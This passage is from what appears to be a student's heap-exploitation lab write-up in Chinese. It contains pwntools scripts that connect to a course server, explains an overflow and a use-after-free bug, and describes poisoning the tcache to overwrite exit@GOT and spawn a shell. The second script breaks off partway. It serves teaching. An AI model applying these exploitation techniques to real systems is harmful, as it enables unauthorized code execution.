<a id="__codelineno-2-22" name="__codelineno-2-22"></a><a href="#__codelineno-2-22"><span class="linenos" data-linenos="22 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-2-23" name="__codelineno-2-23"></a><a href="#__codelineno-2-23"><span class="linenos" data-linenos="23 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-24" name="__codelineno-2-24"></a><a href="#__codelineno-2-24"><span class="linenos" data-linenos="24 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-2-25" name="__codelineno-2-25"></a><a href="#__codelineno-2-25"><span class="linenos" data-linenos="25 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-26" name="__codelineno-2-26"></a><a href="#__codelineno-2-26"><span class="linenos" data-linenos="26 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-2-27" name="__codelineno-2-27"></a><a href="#__codelineno-2-27"><span class="linenos" data-linenos="27 "></span></a>    <span class="k">return</span>
<a id="__codelineno-2-28" name="__codelineno-2-28"></a><a href="#__codelineno-2-28"><span class="linenos" data-linenos="28 "></span></a>
<a id="__codelineno-2-29" name="__codelineno-2-29"></a><a href="#__codelineno-2-29"><span class="linenos" data-linenos="29 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_show</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]:</span>
<a id="__codelineno-2-30" name="__codelineno-2-30"></a><a href="#__codelineno-2-30"><span class="linenos" data-linenos="30 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-31" name="__codelineno-2-31"></a><a href="#__codelineno-2-31"><span class="linenos" data-linenos="31 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
<a id="__codelineno-2-32" name="__codelineno-2-32"></a><a href="#__codelineno-2-32"><span class="linenos" data-linenos="32 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-33" name="__codelineno-2-33"></a><a href="#__codelineno-2-33"><span class="linenos" data-linenos="33 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-2-34" name="__codelineno-2-34"></a><a href="#__codelineno-2-34"><span class="linenos" data-linenos="34 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-35" name="__codelineno-2-35"></a><a href="#__codelineno-2-35"><span class="linenos" data-linenos="35 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-2-36" name="__codelineno-2-36"></a><a href="#__codelineno-2-36"><span class="linenos" data-linenos="36 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user name: &quot;</span><span class="p">)</span>
<a id="__codelineno-2-37" name="__codelineno-2-37"></a><a href="#__codelineno-2-37"><span class="linenos" data-linenos="37 "></span></a>    <span class="n">recv_name</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-2-38" name="__codelineno-2-38"></a><a href="#__codelineno-2-38"><span class="linenos" data-linenos="38 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user motto: &quot;</span><span class="p">)</span>
<a id="__codelineno-2-39" name="__codelineno-2-39"></a><a href="#__codelineno-2-39"><span class="linenos" data-linenos="39 "></span></a>    <span class="n">recv_motto</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-2-40" name="__codelineno-2-40"></a><a href="#__codelineno-2-40"><span class="linenos" data-linenos="40 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user intro: &quot;</span><span class="p">)</span>
<a id="__codelineno-2-41" name="__codelineno-2-41"></a><a href="#__codelineno-2-41"><span class="linenos" data-linenos="41 "></span></a>    <span class="n">recv_intro</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-2-42" name="__codelineno-2-42"></a><a href="#__codelineno-2-42"><span class="linenos" data-linenos="42 "></span></a>    <span class="k">return</span> <span class="n">recv_name</span><span class="p">,</span> <span class="n">recv_motto</span><span class="p">,</span> <span class="n">recv_intro</span>
<a id="__codelineno-2-43" name="__codelineno-2-43"></a><a href="#__codelineno-2-43"><span class="linenos" data-linenos="43 "></span></a>
<a id="__codelineno-2-44" name="__codelineno-2-44"></a><a href="#__codelineno-2-44"><span class="linenos" data-linenos="44 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_edit</span><span class="p">(</span>
<a id="__codelineno-2-45" name="__codelineno-2-45"></a><a href="#__codelineno-2-45"><span class="linenos" data-linenos="45 "></span></a>    <span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_intro</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_motto</span><span class="p">:</span> <span class="nb">bytes</span>
<a id="__codelineno-2-46" name="__codelineno-2-46"></a><a href="#__codelineno-2-46"><span class="linenos" data-linenos="46 "></span></a><span class="p">):</span>
<a id="__codelineno-2-47" name="__codelineno-2-47"></a><a href="#__codelineno-2-47"><span class="linenos" data-linenos="47 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-48" name="__codelineno-2-48"></a><a href="#__codelineno-2-48"><span class="linenos" data-linenos="48 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
<a id="__codelineno-2-49" name="__codelineno-2-49"></a><a href="#__codelineno-2-49"><span class="linenos" data-linenos="49 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-50" name="__codelineno-2-50"></a><a href="#__codelineno-2-50"><span class="linenos" data-linenos="50 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-2-51" name="__codelineno-2-51"></a><a href="#__codelineno-2-51"><span class="linenos" data-linenos="51 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-52" name="__codelineno-2-52"></a><a href="#__codelineno-2-52"><span class="linenos" data-linenos="52 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-2-53" name="__codelineno-2-53"></a><a href="#__codelineno-2-53"><span class="linenos" data-linenos="53 "></span></a>
<a id="__codelineno-2-54" name="__codelineno-2-54"></a><a href="#__codelineno-2-54"><span class="linenos" data-linenos="54 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new name &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-55" name="__codelineno-2-55"></a><a href="#__codelineno-2-55"><span class="linenos" data-linenos="55 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_name</span><span class="p">)</span>
<a id="__codelineno-2-56" name="__codelineno-2-56"></a><a href="#__codelineno-2-56"><span class="linenos" data-linenos="56 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new introduction &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-57" name="__codelineno-2-57"></a><a href="#__codelineno-2-57"><span class="linenos" data-linenos="57 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_intro</span><span class="p">)</span>
<a id="__codelineno-2-58" name="__codelineno-2-58"></a><a href="#__codelineno-2-58"><span class="linenos" data-linenos="58 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new motto &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-59" name="__codelineno-2-59"></a><a href="#__codelineno-2-59"><span class="linenos" data-linenos="59 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_motto</span><span class="p">)</span>
<a id="__codelineno-2-60" name="__codelineno-2-60"></a><a href="#__codelineno-2-60"><span class="linenos" data-linenos="60 "></span></a>    <span class="k">return</span>
<a id="__codelineno-2-61" name="__codelineno-2-61"></a><a href="#__codelineno-2-61"><span class="linenos" data-linenos="61 "></span></a>
<a id="__codelineno-2-62" name="__codelineno-2-62"></a><a href="#__codelineno-2-62"><span class="linenos" data-linenos="62 "></span></a><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;8.154.20.109&#39;</span><span class="p">,</span><span class="mi">10400</span><span class="p">)</span>
<a id="__codelineno-2-63" name="__codelineno-2-63"></a><a href="#__codelineno-2-63"><span class="linenos" data-linenos="63 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;StudentID:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-2-64" name="__codelineno-2-64"></a><a href="#__codelineno-2-64"><span class="linenos" data-linenos="64 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;----------&#39;</span><span class="p">)</span><span class="o">//</span><span class="n">学号</span>
<a id="__codelineno-2-65" name="__codelineno-2-65"></a><a href="#__codelineno-2-65"><span class="linenos" data-linenos="65 "></span></a><span class="c1"># p = process(&#39;./uninit&#39;)  </span>
<a id="__codelineno-2-66" name="__codelineno-2-66"></a><a href="#__codelineno-2-66"><span class="linenos" data-linenos="66 "></span></a><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./uninit&quot;</span><span class="p">)</span>
<a id="__codelineno-2-67" name="__codelineno-2-67"></a><a href="#__codelineno-2-67"><span class="linenos" data-linenos="67 "></span></a><span class="n">A</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;the sacred and awesome flag is &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<a id="__codelineno-2-68" name="__codelineno-2-68"></a><a href="#__codelineno-2-68"><span class="linenos" data-linenos="68 "></span></a><span class="n">handle_show</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<a id="__codelineno-2-69" name="__codelineno-2-69"></a><a href="#__codelineno-2-69"><span class="linenos" data-linenos="69 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p><img alt="uninit" src="pic/uninit.jpg" /> </p>
<h4 id="overflow">Overflow<a class="headerlink" href="#overflow" title="Permanent link">&para;</a></h4>
<div class="language-c highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><a href="#__codelineno-3-1"><span class="linenos" data-linenos="1 "></span></a><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">info</span><span class="o">-&gt;</span><span class="n">intro</span><span class="p">,</span><span class="w"> </span><span class="mh">0x60</span><span class="p">);</span>
</code></pre></div>
<p>​   程序中这一段代码存在overflow问题。在程序中，为<code>info-&gt;intro</code>分配的内存空间为0x40，但是在<code>user_edit()</code>函数中对于<code>info-&gt;intro</code>的读取长度限制到了0x60，也就是说溢出了0x20的内存。根据堆上的空间分布，溢出的内存可以填充下一个chunk的pre_size，size，fd指针以及bd指针。利用这个漏洞，可以篡改fd和bk指针，以达成任意内存空间读写的操作，详细攻击代码见【堆上漏洞的利用】模块。</p>
<h4 id="uaf">Uaf<a class="headerlink" href="#uaf" title="Permanent link">&para;</a></h4>
<div class="language-C highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><a href="#__codelineno-4-1"><span class="linenos" data-linenos="1 "></span></a><span class="c1">// infos[index] = NULL;</span>
</code></pre></div>
<p>​   相比原程序，uaf.c中没有对释放的内存的指针进行置空操作，也就是说在内存被释放之后，仍可以利用原来的指针对该空间的内存进行操作。在此基础上，我们可以在chunk被释放后，利用<code>user_edit()</code>函数进行对该空间的fd指针和bk指针进行篡改，进而实现对任意内存空间的读写，详细攻击代码见【堆上漏洞的利用】模块。</p>
<h2 id="_5">堆上漏洞的利用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<h4 id="overflow_1">Overflow<a class="headerlink" href="#overflow_1" title="Permanent link">&para;</a></h4>
<p>​   在攻击脚本中，首先申请了3个内存空间A、B、C，然后释放了C和B。这时，存在<code>tcache-&gt;B-&gt;C</code>的分布，又根据【堆管理器基础】模块中对于这个程序堆内存的分析，B chunk的实际位置应位于A chunk的后面。在此基础上，对A chunk进行overflow的操作，构造<code>payload=b'A'*0x50+p64(elf.got['exit'])</code>，利用<code>user_edit()</code>将<code>payload</code>传入<code>A-&gt;intro</code>，这时，溢出的<code>exit()</code>地址覆盖了B chunk的fd指针。此时，再申请内存空间D，这时tcache的指针会被修改到B chunk的fd指针，即<code>tcache-&gt;exit@GOT</code>。然后再申请内存空间E，并将第一个参数即<code>name</code>设为<code>elf.symbols['backdoor']</code>，内存空间的实际位置位于exit的got表位置，于是exit的got表被修改为了<code>backdoor()</code>函数的地址。最后，输入一个不存在的指令符，使程序触发<code>exit()</code>，然后就成功触发了后门，执行了<code>system("/bin/sh")</code>，完成了攻击。</p>
<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><a href="#__codelineno-5-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-5-2" name="__codelineno-5-2"></a><a href="#__codelineno-5-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Tuple</span>
<a id="__codelineno-5-3" name="__codelineno-5-3"></a><a href="#__codelineno-5-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<a id="__codelineno-5-4" name="__codelineno-5-4"></a><a href="#__codelineno-5-4"><span class="linenos" data-linenos=" 4 "></span></a>
<a id="__codelineno-5-5" name="__codelineno-5-5"></a><a href="#__codelineno-5-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_add</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">intro</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">motto</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
<a id="__codelineno-5-6" name="__codelineno-5-6"></a><a href="#__codelineno-5-6"><span class="linenos" data-linenos=" 6 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-7" name="__codelineno-5-7"></a><a href="#__codelineno-5-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
<a id="__codelineno-5-8" name="__codelineno-5-8"></a><a href="#__codelineno-5-8"><span class="linenos" data-linenos=" 8 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-9" name="__codelineno-5-9"></a><a href="#__codelineno-5-9"><span class="linenos" data-linenos=" 9 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<a id="__codelineno-5-10" name="__codelineno-5-10"></a><a href="#__codelineno-5-10"><span class="linenos" data-linenos="10 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-11" name="__codelineno-5-11"></a><a href="#__codelineno-5-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-5-12" name="__codelineno-5-12"></a><a href="#__codelineno-5-12"><span class="linenos" data-linenos="12 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;introduction &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-13" name="__codelineno-5-13"></a><a href="#__codelineno-5-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">intro</span><span class="p">)</span>
<a id="__codelineno-5-14" name="__codelineno-5-14"></a><a href="#__codelineno-5-14"><span class="linenos" data-linenos="14 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;motto &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-15" name="__codelineno-5-15"></a><a href="#__codelineno-5-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">motto</span><span class="p">)</span>
<a id="__codelineno-5-16" name="__codelineno-5-16"></a><a href="#__codelineno-5-16"><span class="linenos" data-linenos="16 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;at index &quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<a id="__codelineno-5-17" name="__codelineno-5-17"></a><a href="#__codelineno-5-17"><span class="linenos" data-linenos="17 "></span></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-5-18" name="__codelineno-5-18"></a><a href="#__codelineno-5-18"><span class="linenos" data-linenos="18 "></span></a>    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<a id="__codelineno-5-19" name="__codelineno-5-19"></a><a href="#__codelineno-5-19"><span class="linenos" data-linenos="19 "></span></a>
<a id="__codelineno-5-20" name="__codelineno-5-20"></a><a href="#__codelineno-5-20"><span class="linenos" data-linenos="20 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_del</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<a id="__codelineno-5-21" name="__codelineno-5-21"></a><a href="#__codelineno-5-21"><span class="linenos" data-linenos="21 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-22" name="__codelineno-5-22"></a><a href="#__codelineno-5-22"><span class="linenos" data-linenos="22 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-5-23" name="__codelineno-5-23"></a><a href="#__codelineno-5-23"><span class="linenos" data-linenos="23 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-24" name="__codelineno-5-24"></a><a href="#__codelineno-5-24"><span class="linenos" data-linenos="24 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-5-25" name="__codelineno-5-25"></a><a href="#__codelineno-5-25"><span class="linenos" data-linenos="25 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-26" name="__codelineno-5-26"></a><a href="#__codelineno-5-26"><span class="linenos" data-linenos="26 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-5-27" name="__codelineno-5-27"></a><a href="#__codelineno-5-27"><span class="linenos" data-linenos="27 "></span></a>    <span class="k">return</span>
<a id="__codelineno-5-28" name="__codelineno-5-28"></a><a href="#__codelineno-5-28"><span class="linenos" data-linenos="28 "></span></a>
<a id="__codelineno-5-29" name="__codelineno-5-29"></a><a href="#__codelineno-5-29"><span class="linenos" data-linenos="29 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_show</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]:</span>
<a id="__codelineno-5-30" name="__codelineno-5-30"></a><a href="#__codelineno-5-30"><span class="linenos" data-linenos="30 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-31" name="__codelineno-5-31"></a><a href="#__codelineno-5-31"><span class="linenos" data-linenos="31 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
<a id="__codelineno-5-32" name="__codelineno-5-32"></a><a href="#__codelineno-5-32"><span class="linenos" data-linenos="32 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-33" name="__codelineno-5-33"></a><a href="#__codelineno-5-33"><span class="linenos" data-linenos="33 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-5-34" name="__codelineno-5-34"></a><a href="#__codelineno-5-34"><span class="linenos" data-linenos="34 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-35" name="__codelineno-5-35"></a><a href="#__codelineno-5-35"><span class="linenos" data-linenos="35 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-5-36" name="__codelineno-5-36"></a><a href="#__codelineno-5-36"><span class="linenos" data-linenos="36 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user name: &quot;</span><span class="p">)</span>
<a id="__codelineno-5-37" name="__codelineno-5-37"></a><a href="#__codelineno-5-37"><span class="linenos" data-linenos="37 "></span></a>    <span class="n">recv_name</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-5-38" name="__codelineno-5-38"></a><a href="#__codelineno-5-38"><span class="linenos" data-linenos="38 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user motto: &quot;</span><span class="p">)</span>
<a id="__codelineno-5-39" name="__codelineno-5-39"></a><a href="#__codelineno-5-39"><span class="linenos" data-linenos="39 "></span></a>    <span class="n">recv_motto</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-5-40" name="__codelineno-5-40"></a><a href="#__codelineno-5-40"><span class="linenos" data-linenos="40 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user intro: &quot;</span><span class="p">)</span>
<a id="__codelineno-5-41" name="__codelineno-5-41"></a><a href="#__codelineno-5-41"><span class="linenos" data-linenos="41 "></span></a>    <span class="n">recv_intro</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-5-42" name="__codelineno-5-42"></a><a href="#__codelineno-5-42"><span class="linenos" data-linenos="42 "></span></a>    <span class="k">return</span> <span class="n">recv_name</span><span class="p">,</span> <span class="n">recv_motto</span><span class="p">,</span> <span class="n">recv_intro</span>
<a id="__codelineno-5-43" name="__codelineno-5-43"></a><a href="#__codelineno-5-43"><span class="linenos" data-linenos="43 "></span></a>
<a id="__codelineno-5-44" name="__codelineno-5-44"></a><a href="#__codelineno-5-44"><span class="linenos" data-linenos="44 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_edit</span><span class="p">(</span>
<a id="__codelineno-5-45" name="__codelineno-5-45"></a><a href="#__codelineno-5-45"><span class="linenos" data-linenos="45 "></span></a>    <span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_intro</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_motto</span><span class="p">:</span> <span class="nb">bytes</span>
